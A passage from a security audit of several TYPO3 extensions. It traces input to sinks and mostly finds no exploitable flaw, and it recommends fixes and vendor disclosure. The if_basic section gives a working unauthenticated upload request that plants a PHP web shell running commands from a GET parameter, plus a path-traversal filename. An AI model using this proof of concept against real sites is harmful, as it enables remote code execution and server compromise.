- **Source:** `Classes/Domain/Validator/SpamShieldValidator.php:217-218` — `'request' => $_REQUEST`, `'requestPlain' => print_r($_REQUEST, true)`.
- **Sink:** `Resources/Private/Templates/Log/SpamNotification.html` (last line) — `<f:format.raw>{requestPlain}</f:format.raw>`; rendered by `SpamShieldValidator::createSpamNotificationMessage()` (`:194-200`) and emailed / prepended to the log file (`:182`, `BasicFileUtility::prependContentToFile`).
- **Tainted path:** attacker HTTP request body/query → `$_REQUEST` → StandaloneView variable → raw-printed into notification.
- **Exploitability:** The notification is dispatched as a plain-text log/mail, so `f:format.raw` does not yield browser XSS in the default configuration; it is HTML/content-injection into an admin-facing artifact (and full reflection of attacker-chosen request keys/values into an admin mailbox). If a site delivers this notification as `text/html`, stored-XSS-in-admin-mail becomes reachable. Low severity: admin-only target, requires spam threshold + notifications enabled, no anonymous-victim impact.
- **Fix:** drop `f:format.raw` (let Fluid escape), or stop reflecting raw `$_REQUEST`.

---

## Reviewed and NOT exploitable (negative results with rationale)

These are the surfaces the brief flagged as "prime"; each was traced source→sink and found safe in 13.1.0.

**eID `powermailEidGetLocation` — SSRF: NOT exploitable.**
`ext_localconf.php:60` registers `Eid\GetLocationEid::main` (unauthenticated). It reads `getQueryParams()['lat']`/`['lng']` but **casts both to `(float)`** (`GetLocationEid.php:40-41`) before interpolating into the fixed `https://nominatim.openstreetmap.org/reverse?...&lat=<float>&lon=<float>` URL (`:83`). Host is hard-coded; numeric casting makes the query string non-controllable. No SSRF, no header/URL injection, no CRLF. Only a static outbound call to OpenStreetMap.

**Reflected XSS via prefill GET param (`tx_powermail_pi1[field][marker]`): NOT exploitable.**
`PrefillFieldViewHelper` (`Classes/ViewHelpers/Misc/PrefillFieldViewHelper.php:139-161, initialize():357`) pulls values straight from `FrontendUtility::getArguments()` and returns them. It is consumed in `value="{vh:misc.prefillField(...)}"` across `Resources/Private/Partials/Form/Field/*.html`. The ViewHelper does **not** set `$escapeOutput = false`, so Fluid's default output-escaping htmlspecialchars-encodes the reflected value inside the attribute; no `f:format.raw` wraps it. Attribute breakout is prevented. (This is the historically-patched powermail prefill-XSS, and the fix holds here.)

**Stored/reflected XSS via markers on confirmation/create page and in mails: NOT exploitable.**
`FormController::prepareOutput()` (`Classes/Controller/FormController.php:310-326`) builds marker variables with `MailRepository::getVariablesWithMarkersFromMail($mail, true)` — the `true` runs `ArrayUtility::htmlspecialcharsOnArray()` (`MailRepository.php:360-362`). `{powermail_all}` (rendered via `TemplateUtility::powermailAll`) is emitted through `ManipulateValueWithTypoScriptViewHelper` (`Classes/ViewHelpers/Misc/ManipulateValueWithTypoScriptViewHelper.php`), an `AbstractViewHelper` with default `escapeChildren`/`escapeOutput = true`, so `{answer.value}` is escaped in both the Web and Mail partials (`Resources/Private/Partials/PowermailAll/{Web,Mail}.html`). The `f:format.raw` in `Confirmation.html:17` only wraps already-escaped rendered HTML. Field values in receiver/sender mails are likewise escaped.

**SQL injection from submitted field values: NOT exploitable.**
All user-input-driven queries use Extbase parameterized constraints or int-casts:
- `MailRepository::findByMarkerValueForm()` (`:123`) — used by `UniqueValidator` with the raw submitted `$answer->getValue()` — builds `$query->equals('answers.value', $value)` (bound parameter).
- `MailRepository::removeFromDatabase()` (`:569-579`) and `DatabaseUtility::deleteMailAndAnswersFromDatabase` take `int` identifiers.
- `SaveToAnyTableService::getExistingEntry()` (`:271-281`) uses `createNamedParameter`, filters unique-field name via `removeNotAllowedSigns()` (`preg_replace('/[^a-zA-Z0-9_-]/','')`), and its `additionalWhere` comes from TypoScript, not the request.
Raw-string `->where("...".$var)` occurrences exist only in **backend/admin-authenticated** code (`Classes/Tca/ShowFormNoteEditForm.php`, `Classes/ViewHelpers/Be/PowermailVersionNoteViewHelper.php`, `Classes/Database/QueryGenerator.php`, `Classes/Controller/ModuleController.php` — the latter gated by `BackendUtility::isBackendAdmin()`), and their interpolated values are int-cast or admin-supplied. Not reachable pre-auth.

**Arbitrary file write / path traversal via upload: NOT exploitable.**
`UploadService::uploadAllFiles()` (`:77-93`) is the only `GeneralUtility::upload_copy_move` sink and only runs for freshly-uploaded (`!isUploaded()`) files, guarded by `isFileExtensionAllowed()` (`:116-126`): extension must be in the admin whitelist (`GeneralUtility::inList`), `FileNameValidator::isValid` enforces TYPO3's `fileDenyPattern` (blocks `.php`, `.htaccess`, …), and `GeneralUtility::validPathStr($filename)` rejects `..`/`\`. The write path uses `newName = StringUtility::cleanString($originalName)` (`FileFactory.php:105`), whose regex `[^a-z0-9-\.]→_` strips `/` (so no directory separator survives → no traversal). Confirmation-step hidden-field filenames (`getInstanceFromUploadArguments`) create files flagged `uploaded=true`, so they are never re-written.

**RCE / SSTI via `fluidParseString`, dynamic `makeInstance`, `unserialize`: NOT exploitable.**
`TemplateUtility::fluidParseString()` renders a string as Fluid *source*, but every caller passes an **admin-controlled** source (`SendMailService.php:436` subject/receiverName/etc.; `ReceiverMailReceiverPropertiesService.php:127`; `Field::getTitle()`/settings `Field.php:116,548`); submitted field values are passed only as *variables* (escaped on output), never as template source, so no SSTI. Dynamic `GeneralUtility::makeInstance($class)` in `FinisherRunner`, `DataProcessorRunner`, `SpamShieldValidator`, `ForeignValidator`, `InputValidator` all take class names from TypoScript/flexform (admin), not the request. `RateLimitStorage.php:44` `unserialize` restricts `allowed_classes` to `Window`/`SlidingWindow`/`TokenBucket` on cache-origin data — no object-injection gadget from request input.

**Open redirect via RedirectFinisher: NOT exploitable by default.**
`RedirectUriService::getTarget()` sources the redirect exclusively from FlexForm (`settings.flexform.thx.redirect`) / TypoScript overwrite (`RedirectUriService.php:32-72`) — admin configuration, not request arguments.

---

## Known CVEs / advisories cross-reference

Powermail is distributed via the TYPO3 Extension Repository; its security issues are published as **TYPO3-EXT-SA** advisories rather than always carrying CVE IDs. Historically the extension has received advisories in the 2.x–7.x lines for:
- **Reflected Cross-Site Scripting** via form prefill GET parameters and marker output (the `PrefillFieldViewHelper` / `{powermail_all}` surface).
- **SQL injection** via marker/field handling in older repository code.
- **Information disclosure** in the backend list/export module.

**Affected status for 13.1.0:** This release targets TYPO3 v13 and post-dates all of the above advisories. The corresponding sinks are hardened in the code as traced in the "Reviewed and NOT exploitable" section (Fluid default output-escaping + explicit `htmlspecialcharsOnArray`, Extbase parameterized queries, `FileNameValidator`/`validPathStr` on uploads). No known historical powermail advisory maps to an unpatched sink in this version.

> Note: precise CVE identifiers for the older powermail advisories are not asserted here to avoid fabricating IDs; they are tracked under the vendor's TYPO3-EXT-SA advisory series. Confirm exact IDs against the TYPO3 security advisory index for the affected 2.x–7.x versions if a CVE mapping is required for reporting.

### innologi_typo3-decosdata

#### Security Audit — innologi/typo3-decosdata (decosdata) v3.0.1

**Target eID:** `tx_decosdata_download` (download handler)
**TYPO3 constraint:** 13.4.0–13.4.99 / PHP 8.2–8.4
**Focus:** path traversal / arbitrary file read, access-control bypass
**Verdict:** No exploitable pre-auth vulnerability found. The download handler is correctly protected by an HMAC bound to the site `encryptionKey` and dereferences a FAL file **uid**, not a filesystem path.

---

## Summary

The eID `tx_decosdata_download` is registered pre-auth in `ext_localconf.php`:

```
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['tx_decosdata_download'] = \Innologi\Decosdata\Eid\Download::class;
```

`Eid/Download::run()` delegates to `DownloadService::validateRequest()->sendFile(true)`. The candidate sinks (`filesize`, `fopen`, `readfile`, `readfileByChunks`) all operate on a path derived from `ResourceFactory->getFileObject($this->fileUid)` — a **FAL sys_file uid lookup**, not an attacker-supplied path. Before any file is touched, `validateRequest()` enforces an HMAC over the requested identifiers. The path-traversal / arbitrary-read hunt is therefore disproven, and the access-control angle is closed by the HMAC + encryptionKey.

---

## Analysis of the traced path

**Source** — `Classes/Service/DownloadService.php:validateRequest()` (approx. lines 150–170):

```php
$this->fileUid = (int) $_GET['f'] ?? null;   // int cast
$blobUid       = (int) $_GET['b'] ?? null;
$itemUid       = (int) $_GET['i'] ?? null;
$hash          = (string) $_GET['h'] ?? '';

$this->validRequest = $this->getHashService()->validateHmac(
    $this->generateHashString($this->fileUid, $blobUid, $itemUid),  // "f-b-i|salt"
    $this->secretSalt,
    $hash,
);
if (!$this->validRequest) {
    throw new \Exception('Invalid request', 1515670080);
}
```

**Sink** — `Classes/Service/DownloadService.php:sendFile()` (approx. lines 180–200):

```php
if (!$this->validRequest) { throw new \Exception('The request was not validated', 1515683722); }
$file     = $this->getResourceFactory()->getFileObject($this->fileUid);        // FAL uid → File
$filepath = \TYPO3\CMS\Core\Core\Environment::getPublicPath() . '/' . $file->getPublicUrl();
$filesize = filesize($filepath);
...
readfile($filepath); // (or chunked)
```

### Why path traversal / arbitrary file read does NOT apply
- `f` is `(int)`-cast, so `$this->fileUid` is always an integer. It is never concatenated into a path.
- The read path is computed from `getFileObject($uid)->getPublicUrl()`, i.e. a FAL-indexed file record. There is no attacker-controlled string component reaching `fopen`/`readfile`. `../`, absolute paths, null bytes, PHP wrappers, etc. cannot be injected because the input is numeric and dereferenced through FAL.

### Why the HMAC is not forgeable pre-auth (access-control)
- `generateHashString()` concatenates the uids with the hardcoded `$salt`, and the HMAC is produced via `\TYPO3\CMS\Core\Crypto\HashService::hmac($message, $this->secretSalt)`.
- In TYPO3 v13 the Core `HashService` derives the MAC from the site-wide **`$GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey']`** in addition to the supplied `additionalSecret`. The two hardcoded constants (`$salt`, `$secretSalt`) are public (GPL source), but the encryptionKey is a per-installation secret. Without it an attacker cannot compute a valid `h` for an arbitrary `f`, so they cannot request an arbitrary FAL uid.
- `validateHmac` uses constant-time comparison; no type-juggling bypass (the empty-string default still fails the compare).

### Residual notes (not vulnerabilities)
- The HMAC binds only `(f,b,i)` — it carries no per-user/session binding. This is by design: a generated download URL is a bearer capability for a specific file and works for any (including anonymous) client. It does not let an attacker reach files they weren't already handed a link for, so it is not a privilege-escalation IDOR.
- If a site operator ships an empty/weak/leaked `encryptionKey`, the HMAC would become forgeable — but that is a deployment misconfiguration of the whole TYPO3 instance, not a bug in this extension.

---

## PoC

Not exploitable. A request such as `GET /index.php?eID=tx_decosdata_download&f=1&b=0&i=0&h=<forged>` is rejected with `Invalid request (1515670080)` unless `h` is a valid HMAC produced with the target site's encryptionKey. A legitimately issued link (`h` generated by `getDownloadUrl()`) only yields the exact `f` it was signed for.

## Known CVEs / advisories
No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `decosdata` / `innologi/typo3-decosdata` at v3.0.1. Related TYPO3 core file-upload advisories (e.g. TYPO3-CORE-SA-2025-014) concern the core FAL, not this extension. Nothing applicable to this eID.

**Sources:** [TYPO3 Security Advisories](https://typo3.org/help/security-advisories), [TYPO3-CORE-SA-2025-014](https://typo3.org/security/advisory/typo3-core-sa-2025-014)

### interfrog_if_basic

#### Security Audit — interfrog/if_basic (ifPage Basic) v2.0.0

**Target eID:** `ajaxupload` (AJAX upload handler)
**TYPO3 era:** 8.7 (deps: fluid_styled_content/rte_ckeditor 8.7, powermail 3.8–3.21)
**Focus:** unrestricted file upload → RCE, path traversal, missing auth
**Verdict:** CRITICAL — confirmed **pre-auth unrestricted file upload leading to remote code execution**. An unauthenticated attacker can upload a `.php` file into a web-reachable directory (`fileadmin/user_upload/`) and execute it.

---

## Summary

`ext_localconf.php:15` registers the eID with no authentication and points it at a raw PHP script:

```php
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['ajaxupload'] =
    'EXT:'.$_EXTKEY.'/Classes/Utility/AjaxUploadEid.php';
```

The handler (`Classes/Utility/AjaxUploadEid.php`, class `AjaxUploadController::init()`) takes `$_FILES['SelectedFile']`, "validates" it against a **client-supplied MIME type**, then writes it to `fileadmin/user_upload/<date>-<original-name>` using `move_uploaded_file()`. The extension/type of the original filename is preserved verbatim, the content-type check trusts attacker-controlled data, and the image-content check is commented out. `fileadmin/` is served directly by the web server in a default TYPO3 install, so an uploaded `.php` file is directly executable.

---

## Finding 1 — Unrestricted file upload → RCE (CRITICAL, PRE-AUTH)

**Severity:** Critical
**Pre-auth:** Yes — eID handlers run before any FE/BE authentication; no login, CSRF token, or referer check exists anywhere in the flow.

**Source** — `Classes/Utility/AjaxUploadEid.php`, `init()`:
```php
$this->uploadedFile = $_FILES['SelectedFile'];      // fully attacker-controlled multipart upload
$this->validateFile();
...
$newFile = $this->targetFolder . date('Y-m-d--H-i-s') . '-' . $this->uploadedFile['name'];
if (!move_uploaded_file($this->uploadedFile['tmp_name'], $newFile)) { ... }   // SINK
```

**Broken validation** — `validateFile()`:
```php
// if(!getimagesize($this->uploadedFile['tmp_name'])){ ... }   // <-- commented out, disabled
if(!in_array($this->uploadedFile['type'], $this->allowedMimeTypes)) {   // 'type' = client-sent Content-Type
    array_push($this->errors,'Unsupported filetype uploaded.');
}
if($this->uploadedFile['size'] > $this->allowedFileSize){ ... }
```

**Tainted path:**
`$_FILES['SelectedFile']['type']` and `['name']` (both set by the client in the multipart body)
→ `validateFile()` only compares `['type']` against `['image/png','image/jpeg','image/gif']`
→ the sole real content check (`getimagesize`) is commented out
→ `['name']` (extension intact) is appended to `targetFolder` and passed to `move_uploaded_file()`
→ file lands at `fileadmin/user_upload/<timestamp>-evil.php`, which the web server executes on request.

**Why it is exploitable:**
- `$_FILES[...]['type']` is the browser/attacker-declared MIME string, not derived from content. Sending `Content-Type: image/png` for the `SelectedFile` part passes the whitelist while the actual bytes are PHP.
- The filename extension is never checked or normalized; `date('Y-m-d--H-i-s') . '-' . name` keeps `evil.php` as `.php`.
- `targetFolder` defaults to `fileadmin/user_upload/` (web-reachable). It can only be overridden by TypoScript (`plugin.tx_powermail.settings.setup.ajaxUpload.targetFolder`), not by the attacker — and the default is already exploitable.
- No auth gate: eID is dispatched by TYPO3's frontend before authentication; anyone on the network can call it.

**PoC request:**
```
POST /index.php?eID=ajaxupload HTTP/1.1
Host: victim
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="SelectedFile"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['c']); ?>
--X--
```
Response: `{"status":"done","fileName":"fileadmin/user_upload/2026-08-04--12-00-00-shell.php"}`
Then: `GET /fileadmin/user_upload/2026-08-04--12-00-00-shell.php?c=id` → command execution.
(The timestamp prefix is returned in the JSON `fileName`, so the exact URL is known to the attacker; even if it weren't, it is second-granularity and trivially brute-forced.)

---

## Finding 2 — Path traversal in target path (HIGH, PRE-AUTH)

**Severity:** High (secondary; subsumed by Finding 1 for impact)
**Pre-auth:** Yes.

`$this->uploadedFile['name']` is concatenated into the destination with no `basename()`/sanitization:
```php
$newFile = $this->targetFolder . date('Y-m-d--H-i-s') . '-' . $this->uploadedFile['name'];
move_uploaded_file($this->uploadedFile['tmp_name'], $newFile);
```
A multipart `filename` containing a path separator (e.g. `x/../../../typo3conf/evil.php`) resolves to `fileadmin/user_upload/<ts>-x/../../../typo3conf/evil.php`, letting the attacker escape `user_upload/` and write elsewhere in the docroot (subject to directory existence / write permissions). This widens where the RCE payload can be planted. Note the date prefix defeats a bare leading `../` (the segment becomes `<ts>-..`), but a name of the form `dir/../../...` traverses normally because the `/` splits the prefix from the `..` segments.

---

## Finding 3 — Missing authentication / unauthenticated PID injection (INFO)

`initTSSettings()` takes `$_GET['id']` unsanitized as the page id used to bootstrap `TypoScriptFrontendController` and `EidUtility::initFeUser()`. This confirms the endpoint runs with no auth and lets an attacker choose which page's TypoScript is loaded (thereby influencing `allowedMimeTypes`/`allowedFileSize`/`targetFolder` if any page in the tree defines weaker values). Lower impact than Findings 1–2 but reinforces that the whole handler is unauthenticated.

---

## Known CVEs / advisories
No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `if_basic` / `interfrog/if_basic` v2.0.0. The pattern matches the class of "Unrestricted File Upload" issues TYPO3 tracks in core (e.g. TYPO3-CORE-SA-2021-002, TYPO3-CORE-SA-2025-014), but this is an extension-specific, unreported bug. Recommend responsible disclosure to the vendor (info@interfrog.de) and immediate mitigation.

**Remediation:** enforce a server-side extension allowlist (reject anything but real image extensions), validate real content with `getimagesize()`/finfo, `basename()` the filename, drop the trust in `$_FILES[...]['type']`, and add an authentication/CSRF check to the eID.

**Sources:** [TYPO3-CORE-SA-2021-002 (Unrestricted File Upload in Form Framework)](https://typo3.org/security/advisory/typo3-core-sa-2021-002), [TYPO3-CORE-SA-2025-014 (Unrestricted File Upload in FAL)](https://typo3.org/security/advisory/typo3-core-sa-2025-014), [CVE-2025-47939 advisory](https://github.com/advisories/GHSA-9hq9-cr36-4wpj)

### ipf_bib

#### Security Audit — `ipf/bib` (Bib — bibliography manager)

- **File audited:** `pi1/class.tx_bib_pi1.php` (3532 lines) + SQL-bearing helpers (`Classes/Utility/ReferenceReader.php`, `Classes/Utility/DbUtility.php`).
- **Version:** 1.6.1 (`state = beta`) — `ext_emconf.php:7`
- **TYPO3 compat:** `6.2.0 - 7.99.99`, PHP `5.5.0 - 7.0.99` — `ext_emconf.php`
- **Note:** `ipf_bib/pi1/class.tx_bib_pi1.php` is **byte-identical** to `subugoe_bib/pi1/class.tx_bib_pi1.php` (`diff` confirms identical, same author Ingo Pfennigstorf, same version). Findings are identical.
- **Reachability:** Anonymous frontend list/search plugin. Search (`piVars['search']['all']`, `['ref_ids']`, `['all_rule']`), pagination (`piVars['page']`), single view (`piVars['show_uid']`) reachable by any visitor. Editor/import/delete are gated behind `edit_mode` (`:195`), requiring a valid BE user or whitelisted FE user plus `editor.enabled`.

---

## Issue 1 — Only raw SQL in pi1 (`checkFEauthorRestriction`) → **FALSE POSITIVE (gated + not request-tainted)**

`:3087-3091`:

```php
$res = $this->getDatabaseConnection()->exec_SELECTquery(
    'fe_user_id',
    'tx_bib_domain_model_author as a, tx_bib_domain_model_authorships as m',
    'a.uid = m.author_id AND m.pub_id = ' . $publicationId
);
```

`$publicationId` = `$pub['uid']` from the caller (`:2353`) — a DB-sourced integer, not request input. Block runs only when `$editMode` is true (`:2352`, requires authenticated BE/whitelisted FE user via `:190-195`) and `conf['FE_edit_own_records'] != 0` (TS, `:3084`). Not pre-auth, not tainted.

**Verdict: FALSE POSITIVE.**

---

## Issue 2 — Anonymous search terms → SQL → **hardened**

`piVars['search']['all']` / `['ref_ids']` (`pi1:1209-1233`) → `extConf['filters']` → `ReferenceReader` → `exec_SELECTquery`.
- `ref_ids`: `GeneralUtility::intExplode` → integers (`pi1:1211`).
- Search words: reach SQL only via `fullQuoteStr` — `ReferenceReader.php:1140` (`... LIKE $word`), also `:529`, `:665`, `:1021`, `:1220`.
- Numeric filters (years/uid/states/rule/types): `intval` / `implode_intval` (`pi1:945-1039`).
- `show_uid`: `intval` (`pi1:1381`); `page`: `Utility::crop_to_range` numeric clamp (`pi1:1481`).

**Verdict: hardened.**

---

## Issue 3 — ORDER BY built by raw concatenation → **FALSE POSITIVE (FlexForm-driven)**

`ReferenceReader.php:1368-1370` concatenates `$filter['sorting'][$i]['field'] . ' ' . [...]['dir']` into `ORDER BY` (unquotable identifier sink). But `filters['sort']['sorting']` is populated only from FlexForm `sorting` (`pi1:346`, `initializeSortingFilter :1500-1563`), `date_sorting` FlexForm/TS, or hard-coded table-prefixed field lists. No `piVars`/`_GP` reaches it — it is backend-editor config, not attacker input.

**Verdict: FALSE POSITIVE.**

---

## Issue 4 — Pre-auth stored/reflected XSS
Rendered data is editor-curated bibliography records; anonymous create/edit is behind `edit_mode` (`:195`). No anonymous write→display path. Not a pre-auth finding.

---

## Summary

| Issue | Verdict |
|---|---|
| Raw SQL `checkFEauthorRestriction` (`:3087`) | **FALSE POSITIVE** — auth-gated; `$publicationId` DB-sourced int |
| Anonymous search terms → SQL | **hardened** — `intExplode` / `fullQuoteStr` |
| ORDER BY concatenation | **FALSE POSITIVE** — FlexForm/TS config, not request |
| Pre-auth stored XSS | Not present |

*(Identical source to `subugoe_bib`; see `subugoe_bib.md` for the same analysis.)*

### jambagecom_taxajax

#### Security Audit — `jambagecom/taxajax` (TYPO3 adapted xajax 0.2.4)

- **Extension**: taxajax — legacy `xajax` AJAX library adapted for TYPO3.
- **Version**: 1.4.0 (`ext_emconf.php`); constraints TYPO3 12.4.0–13.4.99, PHP 8.2–8.4, depends `div2007 2.x`.
- **Entry point**: PSR-15 frontend middleware `jambagecom/taxajax/preprocessing` (`Classes/Middleware/XajaxHandler.php`), triggered by request param `taxajax`. Runs `after prepare-tsfe-rendering`, `before content-length-headers` → **pre-auth** reachable in the frontend.
- **Key architectural fact**: this extension ships the xajax *library*. It registers **no** `taxajax_include` handler itself, and never calls `processRequests()`, `getJavascript()` or `printJavascript()`. Those are invoked only by *consumer* extensions. The middleware returns `404` (`XajaxHandler.php:103`) unless a consumer has registered `$GLOBALS['TYPO3_CONF_VARS']['FE']['taxajax_include'][<key>]`.
- **Client behaviour** (`Resources/Public/JavaScript/xajax.js`): the xajax response is an XML command envelope the client parses and executes — `cmd=="js"` → `eval(data)` (line 155); `cmd=="as"` → assign incl. `innerHTML`. So values that reach the envelope and are processed by the client ARE script-execution capable — **but only when the same-origin xajax client itself fetches and processes the response.**

---

## Issue 1 — CodeQL Reflected XSS `Classes/Middleware/XajaxHandler.php:117`

**Verdict: FALSE POSITIVE**

```php
// :61-62  $taxajax = getParsedBody()['taxajax'] ?? getQueryParams()['taxajax'];
// :102    if (!isset($GLOBALS[...]['taxajax_include'][$taxajax])) return 404;   // must be a REGISTERED key
// :116    trigger_error('taxajax "' . $taxajax . '" is registered with a script to the file "'...', E_USER_ERROR);
```
- `$taxajax` is reflected, but to reach line 116 it must first pass line 102 — i.e. be an **already-registered** `taxajax_include` key (attacker cannot supply arbitrary values), and that key's config must be a legacy file-path string (non `class::method`).
- `trigger_error` writes to the PHP error channel (log / `display_errors`), **not** to the HTTP response body. It only surfaces in output when `display_errors` is on (dev), and even then via PHP's error formatter, not an application-controlled markup sink.
- **Kill reason**: input constrained to registered keys + not an HTTP-response markup sink.

## Issue 2 — CodeQL Reflected XSS `class.tx_taxajax.php:672` (`print $sResponse`)

**Verdict: FALSE POSITIVE (as pre-auth reflected XSS) — real underlying CDATA-breakout weakness documented**

### What is reflected
`processRequests()` reads the function name straight from the request and reflects it into an alert command on the "unknown function" path:
```php
// :526/:537  $sFunctionName = $_POST['xajax'];  /  $_GET['xajax'];
// :574       $objResponse->addAlert('Unknown Function ' . $sFunctionName);
// :646-650   header('Content-type: text/xml; charset=...');
// :672       print $sResponse;
```
And `_cmdXML` (`class.tx_taxajax_response.php:521-547`) wraps the message in `<![CDATA[ ... ]]>` **without escaping `]]>`** (and `bOutputEntities` defaults to `false`), so `$sFunctionName` containing `]]>` can break out of the CDATA and inject an arbitrary `<cmd n="js"><![CDATA[...]]></cmd>` command → client `eval` (real defect).

### Why it is not a confirmable pre-auth reflected XSS here
- **Content-Type is `text/xml`.** Delivering the endpoint as a crafted link makes the browser render an XML document; CDATA/`js` commands are **not** executed on navigation. Script only runs if the origin's own `xajax.js` issues the request (same-origin XHR) and feeds the response to its command processor — a crafted link cannot force that with attacker-chosen `xajax`/`xajaxargs`.
- **Reachability**: `processRequests()` is not called anywhere in this extension; it requires a consumer-registered `taxajax_include` handler (otherwise `XajaxHandler.php:103` returns 404 before any of this runs).
- **Kill reason**: `text/xml` non-executing on navigation + DOM path requires same-origin client + entry point not self-wired in this extension. The `]]>`/unescaped-reflection defect is real and should be fixed (escape `]]>` and `htmlspecialchars` attribute values in `_cmdXML`), but it is not a standalone request→executing-sink chain in the shipped extension.

## Issue 3 — CodeQL Reflected XSS `class.tx_taxajax.php:710` (`print getJavascript()`)

**Verdict: FALSE POSITIVE (unreachable in this extension) — most dangerous latent issue if a consumer uses it**

```php
// :708-710  printJavascript() { print $this->getJavascript(...); }
// :746      $html .= 'var xajaxRequestUri="' . $this->sRequestURI . '";'   // inside inline <script> in an HTML page
// :148-150  $this->sRequestURI defaults to normalizedParams->getRequestUri()  (raw request URI, attacker query string)
```
- This *would* be an HTML-context reflected XSS: `sRequestURI` (the raw request URI) is concatenated unescaped into a `var xajaxRequestUri="..."` inline script that a consumer renders into a `text/html` page. A URL like `...?"></script><script>...` would break out.
- **But**: `getJavascript()`/`printJavascript()` are never called within this extension (it is library API). There is no pre-auth route in taxajax itself that emits this. Exploitability depends entirely on a consumer extension calling `printJavascript()` during page rendering (and on `normalizedParams::getRequestUri()` returning the raw URI unescaped).
- **Kill reason (for this extension)**: no caller / no self-contained request→sink chain. Flagged here as the highest-risk latent defect for downstream consumers; fix by `htmlspecialchars($this->sRequestURI, ENT_QUOTES)` before embedding.

---

### Summary
| Sink | Verdict |
|---|---|
| `XajaxHandler.php:117` reflected XSS | FALSE POSITIVE (registered-key only; `trigger_error` → log, not response) |
| `class.tx_taxajax.php:672` reflected XSS (`print $sResponse`) | FALSE POSITIVE as reflected (text/xml, not executed on navigation; DOM path needs same-origin client; entry not self-wired). Real latent `]]>` CDATA-breakout + unescaped `$_GET['xajax']` reflection. |
| `class.tx_taxajax.php:710` reflected XSS (`print getJavascript()`) | FALSE POSITIVE (library API, no caller in this extension). Latent HTML-context reflected XSS via unescaped `sRequestURI` if a consumer calls `printJavascript()`. |

**No CONFIRMED pre-auth reflected XSS in taxajax as shipped.** The genuine code defects (unescaped `]]>` in `_cmdXML`; unescaped `sRequestURI` in `getJavascriptConfig`; unescaped `$sFunctionName` in alert paths) are library weaknesses that materialize only through consumer wiring and same-origin client processing.

### jambagecom_tt-products

#### Target B — jambagecom_tt-products — 4 unserialize sinks

## Verdict: **DB-sourced — NOT a pre-auth object-injection primitive (weak / not injectable)**

All four named sinks `unserialize()` columns (`status_log`, `orderData`) read from the `sys_products_orders` database table. The serialized bytes are written by the extension itself via `serialize()` of server-constructed arrays. An attacker can influence *which row* is read (via `trackingCode`) but **not the serialized bytes**. Not raw attacker bytes → not a POI primitive.

## Sink-by-sink chain

### 1. `Classes/Controller/WithdrawalController.php:118`
```
:110  $orderRow = $this->orderRepository->findRowByTrackingCode($trackingCode);   // DB SELECT * FROM sys_products_orders
:117  if (!empty($orderRow['status_log'])) {
:118      $statusLog = unserialize($orderRow['status_log']);                      // SINK: DB column, raw (no allowed_classes)
```
`OrderRepository::findRowByTrackingCode()` (`Classes/Domain/Repository/OrderRepository.php:77`) does `select('*')->from('sys_products_orders')->where(tracking_code = :trackingCode)`. `status_log` is a DB column serialized server-side (see `:147` `serialize($statusLog)` write-back in the same file). **DB-sourced.**

### 2 & 3. `lib/class.tx_ttproducts_tracking.php:255` and `:428`
```
:255  $status_log = unserialize($orderRow['status_log']);   // $orderRow from sys_products_orders
:425  $orderRow = $orderObj->getRecord($orderRow['uid']);   // re-fetch DB record
:428  $status_log = unserialize($orderRow['status_log']);   // DB column again
```
`$orderRow` is a `sys_products_orders` DB record (`$orderObj = $tablesObj->get('sys_products_orders')`, `getRecord($uid)`). `status_log` written via `serialize($status_log)` at `:409`. **DB-sourced.** (A third occurrence at `:578` `unserialize($row['status_log'])` is likewise a DB row.)

### 4. `model/class.tx_ttproducts_order.php:797`
```
:791  public function getOrderData($row) {
:797      $orderData = unserialize($row['orderData']);          // DB column `orderData`
:801      $orderData = SystemUtility::unserialize($row['orderData'], false);  // fallback
```
`$row` is a `sys_products_orders` record; `orderData` is written by this same class via `serialize([...])` at `:540` and `:580`. **DB-sourced.**

## allowed_classes

Sinks 1–3 and the primary call in sink 4 are **raw** `unserialize()` (no `allowed_classes`). This would matter *if* the bytes were attacker-controlled — they are not. The fallback at `:801` passes `false` as the 2nd argument (not a valid options array; effectively no class restriction), again moot given the DB source.

## Why not exploitable as pre-auth POI

The `orderData` / `status_log` columns are populated exclusively by `serialize()` of server-assembled arrays during checkout/order-tracking. A frontend visitor supplies only scalar form values, which `serialize()` encodes as **strings nested inside** the array — there is no path for a visitor to inject standalone serialized-object bytes into the column. Turning any of these into POI would require a *separate* write primitive (e.g. SQL injection allowing an arbitrary `status_log`/`orderData` value), which is out of scope here. Absent that, these are DB-sourced and not directly injectable.

## Reachability / auth

The withdrawal and tracking flows are reachable by anonymous frontend visitors (order tracking by `tracking_code`), but reachability does not upgrade severity because the unserialized bytes are not attacker-controlled.

## Version

- tt-products **2.16.11** (state: stable), `ext_emconf.php`.
- TYPO3 constraint: `typo3 => 12.4.0-12.4.99` (also depends on `typo3db_legacy`, `div2007`, `table`).

### jvelletti_jvchat

#### Security Audit — `jvelletti/jvchat` (AJAX Chat)

- **Extension**: jvchat — "AJAX Chat"
- **Version**: 13.4.1 (`ext_emconf.php`); TYPO3 v13-era code (Extbase/Fluid StandaloneView, PSR-15 middleware). No explicit `depends` constraint declared.
- **Pre-auth entry point**: PSR-15 frontend middleware `jv/jvchat/ajax` (`Configuration/RequestMiddlewares.php` → `Classes/Middleware/Ajax.php`), triggered by `?eIDMW=tx_jvchat_pi1`. Runs in the frontend stack (`after: content-length-headers`), reachable **without login**. The legacy eID script `Classes/Eid/JvchatEid.php` is **NOT registered** anywhere (`grep` for `eID_include` / `FE][eID` = empty) → dead/unreachable.
- Note on all sinks: `Chat::perform()` never really "returns" to the middleware — `getMessages`/`returnMessage`/`showArrayAsJson` `echo` + `exit`/`die` directly, and set their own `Content-Type` via `header()`, overriding the middleware's `text/plain` Response.

---

## Issue 1 — CodeQL Reflected XSS `Classes/Eid/Chat.php:689` (`showArrayAsJson` JSONP echo)

**Verdict: FALSE POSITIVE**

```php
// Chat.php:682  header('Content-Type: application/json; charset=utf-8');
// Chat.php:685  $callbackId = ...getParsedBody()["callback"] ?? ...getQueryParams()["callback"];
// Chat.php:689  echo $callbackId . "(" . $jsonOutput . ")";
```
